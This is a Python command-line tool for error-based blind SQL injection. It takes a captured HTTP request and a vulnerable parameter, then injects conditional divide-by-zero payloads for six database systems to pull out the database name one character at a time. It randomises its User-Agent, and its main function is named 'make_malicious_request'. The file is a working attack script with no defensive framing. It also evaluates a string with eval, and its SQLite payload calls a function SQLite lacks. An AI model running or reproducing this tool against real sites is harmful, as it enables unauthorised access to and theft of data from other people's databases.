import argparse, sys, os, requests, string, urllib.parse
from fake_useragent import UserAgent



ua = UserAgent()
user_agent = ua.random 
LETTERS = string.ascii_lowercase + ''.join(map(str, range(10))) + '_'

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', '--request', type=str, required=True, help='URL.')
    parser.add_argument('-p', '--param', type=str, required=True, help='Vulnrable Parameter.')
    parser.add_argument('--dbms', type=str, default='MSSQL', help='SQL System.')
    parser.add_argument('--prefix', type=str, default='', help='Prefix to use in the payload.')
    parser.add_argument('--code', type=int, default=500, help='Status code to identify error.')
    parser.add_argument('--payload', type=str, default='', help='Payload to use.')
    args = parser.parse_args()
    return args

def sub_placeholders(payload: str, index: int, char: str) -> str:
    return payload.replace("X", str(index)).replace("Y", char)

def get_payload(key: str, index: int, char: str) -> str:
    payloads = {
        "MSSQL": r" AND (CASE WHEN SUBSTRING(DB_NAME(),X,1)='Y' THEN 1/0 ELSE 0 END=1)--",
        "MYSQL": r" AND IF(SUBSTRING(DATABASE(),X,1)='Y',1/0,0)=1",
        "ORACLE": r" AND CASE WHEN SUBSTR(USER,X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "POSTGRESQL": r" AND CASE WHEN SUBSTRING(current_database(),X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "SQLITE": r" AND CASE WHEN substr(database(),X,1)='Y' THEN 1/0 ELSE 0 END=1",
        "MARIADB": r" AND IF(SUBSTRING(DATABASE(),X,1)='Y',1/0,0)=1",
    }

    payload = payloads.get(key)
    if not payload: print_exit("Database não encontrado")
    return payload.replace("X", str(index)).replace("Y", char)

def print_exit(str: str) -> str:
    print(str)
    sys.exit(1)

def get_file(file) -> list:
    with open(file, 'r', encoding='utf-8') as f:
        return f.readlines()
    
def parse_form_data(form_data: str) -> dict:
    return dict(urllib.parse.parse_qsl(form_data))

def parse_file(file, param: str) -> dict:
    data = {
        "Method": None,
        "Host": None,
        "Cookie": None,
        "Path": None,
        "Body": None,
    }

    
    for line in file:
        if not data["Method"]:
            data["Method"] = line.split()[0]
        if not data["Path"]:
            data["Path"] = line.split()[1]
        if line.lower().startswith("host:"):
            data["Host"] = line.split(":", 1)[1].strip()
        if line.lower().startswith("cookie:"):
            data["Cookie"] = line.split(":", 1)[1].strip()

    if data["Method"] == "GET":
        data["Body"] = data["Path"].split('?')[1]

    elif file[-2].strip(): 
        print_exit("Error: Body is null")
    else:
        data["Body"] = file[-1].strip()
        if not f'{param}=' in data["Body"]: print_exit(f"Error: Parameter '{param}' not found in Body.")
    return data

def validate_ssl(file) -> str:
    for line in file:
        if line.lower().startswith("origin:"):
            origin = line.split(":", 1)[1].strip()
            if origin.startswith('https'):
                return 'https'
            return 'http'
        else:
            return 'http'
        
def make_original_request(data: dict, ssl: str) -> int:
    url = f'{ssl}://{data["Host"]}{data["Path"]}'
    headers = {
        "Cookie": data["Cookie"],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }
    
    Body = parse_form_data(data["Body"])
    res = requests.post(url, headers=headers, data=Body)
    if res.status_code != 200:
        print_exit(f"Error: Request failed. Status code: {res.status_code}")
    return len(res.content)

def make_malicious_request(data: dict, ssl: str, sql_key: str, res_original_length: int, prefix: str, custom_code: int, custom_payload: str) -> str:
    url = f'{ssl}://{data["Host"]}{data["Path"]}'
    headers = {
        "Cookie": data["Cookie"],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }
    
    Body = parse_form_data(data["Body"])

    dbname = []
    for index in range(1, 64):
        for char in LETTERS:
            payload = sub_placeholders(custom_payload, index, char) if custom_payload else get_payload(sql_key, index, char)
            Body[f'{args.param}'] = prefix + payload if prefix else payload
            res = requests.post(url, headers=headers, data=Body) if data["Method"] == "POST" else requests.get(f"{url}{Body[f'{args.param}']}", headers=headers)

            comparator = "==" if custom_code else "!="
            if eval(f'res.status_code == custom_code and len(res.content) {comparator} res_original_length'):
                dbname.append(char)
                print(f"Letter {char} found in index {index}")
                break
            if char == LETTERS[-1] and len(dbname):
                print_exit(f"Database Name: {''.join(dbname)}")
            elif char == LETTERS[-1]:
                print_exit('Error, no letters were found')

def main(args):
    if not os.path.isfile(args.request):
        print_exit(f"Error: File '{args.request}' not found.")
    elif args.payload:
        if 'X' not in args.payload or 'Y' not in args.payload:
            print_exit('Error: Invalid payload. Use X and Y placeholders. X to Index, Y to letter')
    file_content = get_file(args.request)
    data = parse_file(file_content, args.param)
    ssl = validate_ssl(file_content)
    res_length = make_original_request(data, ssl)
    make_malicious_request(data, ssl, args.dbms, res_length, args.prefix, args.code, args.payload)

if __name__ == "__main__":
    args = arg_parser()
    main(args)
    